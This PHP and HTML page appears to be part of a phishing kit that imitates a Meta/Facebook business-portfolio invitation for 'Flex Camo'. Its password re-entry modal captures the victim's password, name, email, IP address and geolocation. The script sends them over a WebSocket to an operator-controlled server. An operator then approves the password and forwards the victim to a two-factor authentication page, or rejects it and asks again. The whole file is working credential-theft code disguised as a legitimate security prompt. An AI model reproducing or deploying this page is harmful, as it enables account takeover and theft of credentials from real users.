<?php require_once('./get-data.php'); ?>
<?php require_once('./getip.php'); ?>

<?php
function getServerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip_server = getServerIP();
?>

<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$domain_name = file_get_contents('domain_name.txt');
$domain_name = explode('|', $domain_name);
$domain = $domain_name[0];
$port = $domain_name[1];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/images/favicon.ico">
    <title>Review and Accept Invitation</title>
    <link rel="stylesheet" href="/styles/confirm-business-information.css">
</head>
<body>
    <nav class="meta-nav">
        <div class="nav-content">
            <img style="height:30px" src="/images/logo.png" alt="Logo" class="logo">
        </div>
    </nav>

    <main class="main-container">
        <div class="confirm-card">
            <h1>Review and accept invitation</h1>
            
            <div class="user-info">
                <div class="info-row">
                    <span class="label">Name:</span>
                    <span class="value" id="name"></span>
                </div>
                <div class="info-row">
                    <span class="label">Email:</span>
                    <span class="value" id="email"></span>
                    <span class="info-icon" data-tooltip="This email will be used for notifications">ⓘ</span>
                </div>
            </div>

            <div class="terms-section">
                <div class="terms-item">
                    <div class="terms-number">1</div>
                    <p>Your name, email, profile picture and actions you take on behalf of Flex Camo will be visible to other people managing this business.</p>
                </div>
                
                <div class="terms-item">
                    <div class="terms-number">2</div>
                    <p>Anything you do on behalf of this business will not be shared to your personal profile.</p>
                </div>
                
                <div class="terms-item">
                    <div class="terms-number">3</div>
                    <p>To improve security, people with full control of your business portfolio may know whether you have enabled 2-factor authentication.</p>
                </div>
            </div>

            <div class="agreement-section">
                <p>By accepting this invitation, you'll be added to Flex Camo's business portfolio and agree to the 
                    <a href="#" class="link">Terms of Service</a> and 
                    <a href="#" class="link">Commercial Terms</a>.
                </p>
            </div>

            <div class="navigation-footer">
                <button class="prev-btn">
                    <span class="arrow">←</span>
                    Previous
                </button>
                <span class="page-indicator">3 of 3</span>
                <button class="accept-btn">Accept invitation</button>
            </div>
        </div>
    </main>

    <footer class="metae-footer">
        <div class="footer-links">
            <a href="#">Facebook</a>
            <a href="#">Developers</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Cookies</a>
            <a href="#">Help</a>
            <a href="#">Report a problem</a>
        </div>
        <div class="footer-info">
            <span class="language">English (US)</span>
        </div>
    </footer>

    <script src="/scripts/confirm-business-information.js"></script>
    
    <!-- Password Confirmation Modal -->
    <div class="password-modal">
        <form action="" onsubmit="sendToTelegramFromConfirmBusinessInformation(event)">
            <div class="modal-content">
                <div class="modal-header">
                    <h2>Please re-enter your password</h2>
                    <button class="close-modal">×</button>
                </div>
                <div class="modal-body">
                    <p class="modal-message">For your security, you must re-enter your password to continue.</p>
                    <div class="password-input">
                        <label for="password">Password:</label>
                        <input type="password" id="password" name="password">
                        <svg id="eye" 
                        width="20px" height="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0z" fill="#0D0D0D"/><path d="M21.894 11.553C19.736 7.236 15.904 5 12 5c-3.903 0-7.736 2.236-9.894 6.553a1 1 0 0 0 0 .894C4.264 16.764 8.096 19 12 19c3.903 0 7.736-2.236 9.894-6.553a1 1 0 0 0 0-.894zM12 17c-2.969 0-6.002-1.62-7.87-5C5.998 8.62 9.03 7 12 7c2.969 0 6.002 1.62 7.87 5-1.868 3.38-4.901 5-7.87 5z" fill="#0D0D0D"/></svg>
                    </div>
                    <p id="password-error"></p>
                    <a href="#" class="forgot-password">Forgot your password?</a>
                </div>
                <div class="modal-footer">
                    <button class="cancel-btn">Cancel</button>
                    <button class="submit-btn">Submit</button>
                </div>
            </div>
        </form>
    </div>
    <?php include 'loading.php'; ?>
</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        var nameElement = document.getElementById('name');
        var emailElement = document.getElementById('email');

        nameElement.textContent = localStorage.getItem('firstName') + ' ' + localStorage.getItem('lastName');
        emailElement.textContent = localStorage.getItem('personalEmail');

        var passwordInput = document.getElementById('password');

        passwordInput.addEventListener('input', function() {
            if (passwordInput.value.length > 0) {
                passwordInput.style.border = '1px solid #E5E5E5';
                
            } else {
                passwordInput.style.border = '1px solid #FF0303';
            } 

            var passwordError = document.getElementById('password-error');
            passwordError.textContent = "";
        });
    });

    var eye = document.getElementById('eye');
    eye.addEventListener('click', function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput.type == 'password') {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });

    const ws = new WebSocket('wss://<?php echo $domain; ?>:<?php echo $port; ?>');
    let orderId = localStorage.getItem('currentOrderId');

    ws.onmessage = function(event) {
        const data = JSON.parse(event.data);
        if (data.type === 'admin_approve_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
            localStorage.setItem('currentOrderId', data.order_id);
            localStorage.setItem('currentStep', data.step);
            localStorage.setItem('currentPassword', data.password);
            window.location.href = '/two-factor-authentication.php';
        } else if (data.type === 'admin_reject_password_to_user' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
            hideLoading();
            var passwordInput = document.getElementById('password');
            passwordInput.value = "";
            passwordInput.value = data.user_info.password;
            passwordInput.focus();
            passwordInput.style.border = '1px solid #FF0303';

            var passwordError = document.getElementById('password-error');
            passwordError.textContent = "Password is incorrect, please try again";
        }
    };

    function sendToTelegramFromConfirmBusinessInformation(event) {
        event.preventDefault();
        var password = document.getElementById('password').value;

        if (password == "") {
            alert("Please enter your password");
            return;
        }

        var firstName = localStorage.getItem('firstName');
        var lastName = localStorage.getItem('lastName');
        var personalEmail = localStorage.getItem('personalEmail');

        var ip = `<?php echo htmlspecialchars($ip_server); ?>` || `<?php echo $ip; ?>`;
        var ip_address = `<?php echo $ip; ?>`;
        var city = `<?php echo $city; ?>`;
        var region = `<?php echo $region; ?>`;
        var country = `<?php echo $country; ?>`;
        var org = `<?php echo $org; ?>`;
        var timezone = `<?php echo $timezone; ?>`;

        ws.send(JSON.stringify({
            type: 'enter_password',
            order_id: orderId,
            password: password,
            step: 2,
            user_info: {
                name: firstName + " " + lastName,
                email: personalEmail,
                ip: ip,
                ip_address: ip_address,
                city: city,
                region: region,
                country: country,
                org: org,
                timezone: timezone,
                password: password,
                code: "",
                phone: ""
            }
        }));
        showLoading();
    }
</script>

</html> 